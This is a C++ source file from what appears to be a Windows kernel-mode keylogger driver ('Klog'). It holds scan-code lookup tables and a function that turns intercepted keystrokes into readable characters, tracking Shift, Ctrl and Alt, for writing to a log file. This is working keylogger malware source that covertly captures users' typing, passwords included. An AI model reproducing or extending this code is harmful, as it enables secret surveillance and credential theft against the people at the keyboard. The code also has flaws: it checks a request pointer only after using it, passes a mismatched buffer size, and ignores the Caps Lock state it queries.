extern "C"
{
	#include "ntddk.h"
}

#include "ntddkbd.h"
#include "Klog.h"
#include "KbdLog.h"
#include "KbdHook.h"
#include "ScanCode.h"

////////////////////////////////////////////////////////////////////////////
// SCAN CODE MAP - For the purposes of this driver, the only keys 
// that will be logged are the alphabetical keys, the numeric keys, 
// and the special characters (ie. #,$,%,ect). Keys like, "ENTER",
// "SHIFT", "ESC", ect will filtered out and not be logged out to the file.
////////////////////////////////////////////////////////////////////////////
#define INVALID 0X00 //scan code not supported by this driver
#define SPACE 0X01 //space bar
#define ENTER 0X02 //enter key
#define LSHIFT 0x03 //left shift key
#define RSHIFT 0x04 //right shift key
#define CTRL  0x05 //control key
#define ALT	  0x06 //alt key

char KeyMap[84] = {
INVALID, //0
INVALID, //1
'1', //2
'2', //3
'3', //4
'4', //5
'5', //6
'6', //7
'7', //8
'8', //9
'9', //A
'0', //B
'-', //C
'=', //D
INVALID, //E
INVALID, //F
'q', //10
'w', //11
'e', //12
'r', //13
't', //14
'y', //15
'u', //16
'i', //17
'o', //18
'p', //19
'[', //1A
']', //1B
ENTER, //1C
CTRL, //1D
'a', //1E
's', //1F
'd', //20
'f', //21
'g', //22
'h', //23
'j', //24
'k', //25
'l', //26
';', //27
'\'', //28
'`', //29
LSHIFT,	//2A
'\\', //2B
'z', //2C
'x', //2D
'c', //2E
'v', //2F
'b', //30
'n', //31
'm' , //32
',', //33
'.', //34
'/', //35
RSHIFT, //36
INVALID, //37
ALT, //38
SPACE, //39
INVALID, //3A
INVALID, //3B
INVALID, //3C
INVALID, //3D
INVALID, //3E
INVALID, //3F
INVALID, //40
INVALID, //41
INVALID, //42
INVALID, //43
INVALID, //44
INVALID, //45
INVALID, //46
'7', //47
'8', //48
'9', //49
INVALID, //4A
'4', //4B
'5', //4C
'6', //4D
INVALID, //4E
'1', //4F
'2', //50
'3', //51
'0', //52
};

///////////////////////////////////////////////////////////////////////
//The Extended Key Map is used for those scan codes that can map to
//more than one key.  This mapping is usually determined by the 
//states of other keys (ie. the shift must be pressed down with a letter
//to make it uppercase).
///////////////////////////////////////////////////////////////////////
char ExtendedKeyMap[84] = {
INVALID, //0
INVALID, //1
'!', //2
'@', //3
'#', //4
'$', //5
'%', //6
'^', //7
'&', //8
'*', //9
'(', //A
')', //B
'_', //C
'+', //D
INVALID, //E
INVALID, //F
'Q', //10
'W', //11
'E', //12
'R', //13
'T', //14
'Y', //15
'U', //16
'I', //17
'O', //18
'P', //19
'{', //1A
'}', //1B
ENTER, //1C
INVALID, //1D
'A', //1E
'S', //1F
'D', //20
'F', //21
'G', //22
'H', //23
'J', //24
'K', //25
'L', //26
':', //27
'"', //28
'~', //29
LSHIFT,	//2A
'|', //2B
'Z', //2C
'X', //2D
'C', //2E
'V', //2F
'B', //30
'N', //31
'M' , //32
'<', //33
'>', //34
'?', //35
RSHIFT, //36
INVALID, //37
INVALID, //38
SPACE, //39
INVALID, //3A
INVALID, //3B
INVALID, //3C
INVALID, //3D
INVALID, //3E
INVALID, //3F
INVALID, //40
INVALID, //41
INVALID, //42
INVALID, //43
INVALID, //44
INVALID, //45
INVALID, //46
'7', //47
'8', //48
'9', //49
INVALID, //4A
'4', //4B
'5', //4C
'6', //4D
INVALID, //4E
'1', //4F
'2', //50
'3', //51
'0', //52
};

////////////////////////////////////////////////////////////////////////////////////
 // NOTE: All alphabetic characters, numerica characters, and special characters are 
 // converted.  The only non alpha-numeric characters converted are the space bar
 // and the enter key as capturing white space will make the output more readable.
 //
 // Distinction of capital / lowercase letters is by
 // 1. the state of the caps lock indicator
 // 2. the state of the shift key
 //
 // Distinction of special /numeric characters is by
 // 1. the state of the shift key
 //
 // The control and ALT key states are also tracked because letters pressed while the 
 // control key is down typically are "hot key" combinations (ie. like CTRL-V
 // for paste or CTRL-C for cut).  These combinations will not be converted
 // for logging to the file.
 /////////////////////////////////////////////////////////////////////////////////
 //@@@@@@@@@@@@@@@@@@@@@@@@
// IRQL = passive level
//@@@@@@@@@@@@@@@@@@@@@@@@@
void ConvertScanCodeToKeyCode(PDEVICE_EXTENSION pDevExt, KEY_DATA* kData, char* keys)
{
	 //get the key code for the corresponding scan code -- weather or not that key
	 //code is extended will be determined later.
	 char key = 0;
	 key = KeyMap[kData->KeyData];
	 
	 /////////////////////////////////////////
	 //Get and update state of CAPS LOCK key
	 /////////////////////////////////////////
	 KEVENT event = {0};
	 KEYBOARD_INDICATOR_PARAMETERS indParams = {0};
	 IO_STATUS_BLOCK ioStatus = {0};
	 NTSTATUS status = {0};
	 KeInitializeEvent(&event, NotificationEvent, FALSE);

	 PIRP irp = IoBuildDeviceIoControlRequest(IOCTL_KEYBOARD_QUERY_INDICATORS,pDevExt->pKeyboardDevice,
   	 NULL,0,&indParams,sizeof(KEYBOARD_ATTRIBUTES),TRUE,&event,&ioStatus);
     status = IoCallDriver(pDevExt->pKeyboardDevice, irp);

     if (status == STATUS_PENDING) 
	 {
		(VOID) KeWaitForSingleObject(&event,Suspended,KernelMode,
               FALSE,NULL);
     }
	 
	 status = irp->IoStatus.Status;

	 if(status == STATUS_SUCCESS)
	 {
		indParams = *(PKEYBOARD_INDICATOR_PARAMETERS)irp->AssociatedIrp.SystemBuffer;
   	 if(irp)
	 {
		int flag = (indParams.LedFlags & KEYBOARD_CAPS_LOCK_ON);
			DbgPrint("Caps Lock Indicator Status: %x.\n",flag);
	 }
	 else
	 DbgPrint("Error allocating Irp");
	 }//end if

	 switch(key)
	 {
		///////////////////////////////////////
		//Get and update state of SHIFT key
		////////////////////////////////////////
		case LSHIFT:
			if(kData->KeyFlags == KEY_MAKE)
				pDevExt->kState.kSHIFT = true;
			else
				pDevExt->kState.kSHIFT = false;
			break;

		case RSHIFT:
			if(kData->KeyFlags == KEY_MAKE)
				pDevExt->kState.kSHIFT = true;
			else
				pDevExt->kState.kSHIFT = false;
			break;

		///////////////////////////////////////
		//Get and update state of CONTROL key
		///////////////////////////////////////
		case CTRL:
			if(kData->KeyFlags == KEY_MAKE)
				pDevExt->kState.kCTRL = true;
			else
				pDevExt->kState.kCTRL = false;
			break;
		 
	    ///////////////////////////////////////
		//Get and update state of ALT key
		///////////////////////////////////////
		case ALT:
			if(kData->KeyFlags == KEY_MAKE)
				pDevExt->kState.kALT = true;
			else
				pDevExt->kState.kALT = false;
			break;

		///////////////////////////////////////
		//If the space bar was pressed
		///////////////////////////////////////
		case SPACE: 
			if((pDevExt->kState.kALT != true) && (kData->KeyFlags == KEY_BREAK)) //the space bar does not leave 
				keys[0] = 0x20;				//a space if pressed with the ALT key
			break;

		///////////////////////////////////////
		//If the enter key was pressed
		///////////////////////////////////////
		case ENTER:
			if((pDevExt->kState.kALT != true) && (kData->KeyFlags == KEY_BREAK)) //the enter key does not leave 
			{								 //move to the next line if pressed
				keys[0] = 0x0D;				 //with the ALT key
				keys[1] = 0x0A;
			}//end if
			break;

		///////////////////////////////////////////
		//For all other alpha numeric keys
		//If the ALT or CTRL key is pressed, do not
		//convert. If the SHIFT or CAPS LOCK
		//keys are pressed, switch to the
		//extended key map. Otherwise return
		//the current key.
		////////////////////////////////////////////
		default:
			if((pDevExt->kState.kALT != true) && (pDevExt->kState.kCTRL != true) && (kData->KeyFlags == KEY_BREAK)) //don't convert if ALT or CTRL is pressed
			{
				if((key >= 0x21) && (key <= 0x7E)) //don't convert non alpha numeric keys
				{
					if(pDevExt->kState.kSHIFT == true)
						keys[0] = ExtendedKeyMap[kData->KeyData];
					else  
						keys[0] = key;
				}//end if
			}//end if
			break;
	 }//end switch(keys)
}//end ConvertScanCodeToKeyCode


